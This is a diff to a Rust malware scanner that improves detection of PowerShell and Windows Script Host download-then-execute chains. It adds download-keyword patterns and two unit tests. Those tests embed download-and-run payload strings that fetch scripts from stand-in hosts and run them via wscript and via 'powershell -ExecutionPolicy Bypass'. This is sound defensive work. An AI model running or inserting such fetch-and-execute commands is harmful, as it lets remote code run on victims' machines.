@@ -414,10 +414,8 @@ fn destination_basename_looks_like_file(value: &str) -> bool {
             .all(|b| b.is_ascii_alphanumeric() || b == b'_' || b == b'-')
 }
 
-fn ps_statement_executes_download_destination(statement: &str, dst: &str) -> bool {
-    if !ps_destination_looks_like_script(dst) {
-        return false;
-    }
+fn ps_downloaded_script_execution_cmd(statement: &str, dst: &str) -> Option<String> {
+    let script_kind = destination_script_kind(dst)?;
     let lower_statement = statement.to_ascii_lowercase();
     let lower_dst = dst.to_ascii_lowercase();
     let mut search_start = 0;
@@ -426,33 +424,76 @@ fn ps_statement_executes_download_destination(statement: &str, dst: &str) -> boo
         let segment_start = statement[..pos]
             .rfind(['\r', '\n', ';', '{', '}', '&', '|'])
             .map_or(0, |idx| idx + 1);
-        let segment = &statement[segment_start..pos];
-        if segment.contains('>') {
+        let after_dst = pos + lower_dst.len();
+        let segment_end = statement[after_dst..]
+            .find(['\r', '\n', ';', '{', '}', '&', '|'])
+            .map_or(statement.len(), |idx| after_dst + idx);
+        let segment = &statement[segment_start..segment_end];
+        let lower_segment = segment.to_ascii_lowercase();
+        if segment.contains('>') || ps_segment_looks_like_download(&lower_segment) {
             search_start = pos + lower_dst.len();
             continue;
         }
-        let lower_segment = segment.to_ascii_lowercase();
-        if contains_powershell_invocation(&lower_segment) {
-            return true;
+        if contains_script_invocation(&lower_segment, script_kind) {
+            return Some(segment.trim().trim_matches(['"', '\'']).trim().to_string());
         }
         search_start = pos + lower_dst.len();
     }
-    false
+    None
 }
 
-fn ps_destination_looks_like_script(dst: &str) -> bool {
+#[derive(Copy, Clone)]
+enum PsDownloadedScriptKind {
+    PowerShell,
+    ScriptHost,
+}
+
+fn destination_script_kind(dst: &str) -> Option<PsDownloadedScriptKind> {
     let dst = dst
         .trim()
         .trim_matches(['"', '\''])
         .trim_end_matches(['"', '\'', ')', ']', '}', ';', ','])
         .to_ascii_lowercase();
-    dst.ends_with(".ps1") || dst.ends_with(".psm1")
+    if dst.ends_with(".ps1") || dst.ends_with(".psm1") {
+        return Some(PsDownloadedScriptKind::PowerShell);
+    }
+    if [".js", ".jse", ".vbs", ".vbe", ".wsf"]
+        .iter()
+        .any(|suffix| dst.ends_with(suffix))
+    {
+        return Some(PsDownloadedScriptKind::ScriptHost);
+    }
+    None
 }
 
-fn contains_powershell_invocation(lower_segment: &str) -> bool {
-    lower_segment
-        .split(|ch: char| !matches!(ch, 'a'..='z' | '0'..='9' | '_' | '-' | '.'))
-        .any(|token| matches!(token, "powershell" | "powershell.exe" | "pwsh" | "pwsh.exe"))
+fn contains_script_invocation(lower_segment: &str, script_kind: PsDownloadedScriptKind) -> bool {
+    lower_segment.split(is_command_token_boundary).any(|token| {
+        matches!(
+            (script_kind, token),
+            (
+                PsDownloadedScriptKind::PowerShell,
+                "powershell" | "powershell.exe" | "pwsh" | "pwsh.exe"
+            ) | (
+                PsDownloadedScriptKind::ScriptHost,
+                "wscript" | "wscript.exe" | "cscript" | "cscript.exe"
+            )
+        )
+    })
+}
+
+fn is_command_token_boundary(ch: char) -> bool {
+    !matches!(ch, 'a'..='z' | '0'..='9' | '_' | '-' | '.')
+}
+
+fn ps_segment_looks_like_download(lower_segment: &str) -> bool {
+    lower_segment.contains("downloadfile")
+        || lower_segment.contains("invoke-webrequest")
+        || lower_segment.contains("start-bitstransfer")
+        || lower_segment.contains(" -outfile")
+        || lower_segment.contains(" -outf")
+        || lower_segment.contains(" -out ")
+        || lower_segment.contains(" -o ")
+        || lower_segment.contains(" -uri ")
 }
 
 fn push_download_and_execution_url_argument(
@@ -462,17 +503,17 @@ fn push_download_and_execution_url_argument(
     dst: Option<String>,
     statement: &str,
 ) {
-    let execution_url = dst
+    let execution_cmd = dst
         .as_deref()
-        .filter(|dst| ps_statement_executes_download_destination(statement, dst))
-        .map(|_| src.clone());
+        .and_then(|dst| ps_downloaded_script_execution_cmd(statement, dst));
+    let execution_url = execution_cmd.as_ref().map(|_| src.clone());
     env.traits.push(Trait::Download {
         cmd: cmd.clone(),
         src,
         dst,
     });
-    if let Some(url) = execution_url {
-        push_url_argument_once(env, &cmd, url);
+    if let (Some(execution_cmd), Some(url)) = (execution_cmd, execution_url) {
+        push_url_argument_once(env, &execution_cmd, url);
     }
 }
 
@@ -4742,6 +4783,53 @@ mod herestring_iex_tests {
                 )
             }),
             "downloaded script execution was not linked to source URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn ps1_downloaded_js_wscript_execution_emits_url_argument() {
+        let payload = br#"IWR -useb 'https://script-host.example/payload.js' -outf $env:tmp\\payload.js; wscript $env:tmp\\payload.js"#.to_vec();
+        let mut env = crate::env::Environment::new(&crate::env::Config::default());
+        env.all_extracted_ps1.push(payload);
+
+        scan_ps1_payloads(&mut env);
+
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    crate::traits::Trait::UrlArgument { url, .. }
+                        if url == "https://script-host.example/payload.js"
+                )
+            }),
+            "downloaded script-host execution was not linked to source URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn ps1_downloadfile_then_file_execution_emits_execution_url_argument() {
+        let payload = br#"
+powershell -Command "(New-Object Net.WebClient).DownloadFile('https://script-exec.example/install.ps1', '%TEMP%\Install.ps1')"
+powershell -ExecutionPolicy Bypass -File "%TEMP%\Install.ps1"
+"#
+        .to_vec();
+        let mut env = crate::env::Environment::new(&crate::env::Config::default());
+        env.all_extracted_ps1.push(payload);
+
+        scan_ps1_payloads(&mut env);
+
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    crate::traits::Trait::UrlArgument { cmd, url }
+                        if url == "https://script-exec.example/install.ps1"
+                            && cmd.contains("-File \"%TEMP%\\Install.ps1")
+                )
+            }),
+            "downloaded PowerShell -File execution was not linked to source URL: {:?}",
             env.traits
         );
     }
